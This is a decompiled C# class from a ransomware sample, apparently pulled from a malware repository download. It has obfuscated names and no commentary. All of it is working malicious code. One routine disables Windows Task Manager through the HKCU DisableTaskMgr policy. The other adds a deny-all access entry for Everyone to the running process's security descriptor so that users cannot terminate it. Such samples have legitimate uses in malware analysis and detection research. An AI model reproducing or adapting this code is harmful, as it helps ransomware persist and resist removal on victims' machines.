// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.tOQtIRDNrGpD
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace MufMaOSvGyvz
{
  internal class tOQtIRDNrGpD
  {
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetKernelObjectSecurity(
      IntPtr JFruBjVvHaO,
      int tMPQDUfQDFtVn,
      [Out] byte[] iOESQxslYeYLWx,
      uint KSLIIIqbffaWrLa,
      out uint jxCwtQsOjul);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetKernelObjectSecurity(
      IntPtr hGoxMTUtMZq,
      int TigQegujdRYeQCE,
      [In] byte[] efVMDYZOuLsMi);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    public void ywIDKStthl(bool bool_0)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        if ((!bool_0 ? 1 : (subKey.GetValue("DisableTaskMgr") == null ? 1 : 0)) == 0)
          subKey.DeleteValue("DisableTaskMgr");
        else
          subKey.SetValue("DisableTaskMgr", (object) "1");
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor kXXdBYnfnvZP(IntPtr intptr_0)
    {
      byte[] iOESQxslYeYLWx = new byte[0];
      uint jxCwtQsOjul;
      tOQtIRDNrGpD.GetKernelObjectSecurity(intptr_0, 4, iOESQxslYeYLWx, 0U, out jxCwtQsOjul);
      if (jxCwtQsOjul > (uint) short.MaxValue)
        throw new Win32Exception();
      byte[] binaryForm;
      if (!tOQtIRDNrGpD.GetKernelObjectSecurity(intptr_0, 4, binaryForm = new byte[(IntPtr) jxCwtQsOjul], jxCwtQsOjul, out jxCwtQsOjul))
        throw new Win32Exception();
      return new RawSecurityDescriptor(binaryForm, 0);
    }

    private void UErUYvArZJESJ(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
    {
      byte[] numArray = new byte[rawSecurityDescriptor_0.BinaryLength];
      rawSecurityDescriptor_0.GetBinaryForm(numArray, 0);
      if (!tOQtIRDNrGpD.SetKernelObjectSecurity(intptr_0, 4, numArray))
        throw new Win32Exception();
    }

    public void jkSoOuByvlwrEF()
    {
      IntPtr currentProcess = tOQtIRDNrGpD.GetCurrentProcess();
      RawSecurityDescriptor rawSecurityDescriptor_0 = this.kXXdBYnfnvZP(currentProcess);
      rawSecurityDescriptor_0.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
      this.UErUYvArZJESJ(currentProcess, rawSecurityDescriptor_0);
    }
  }
}
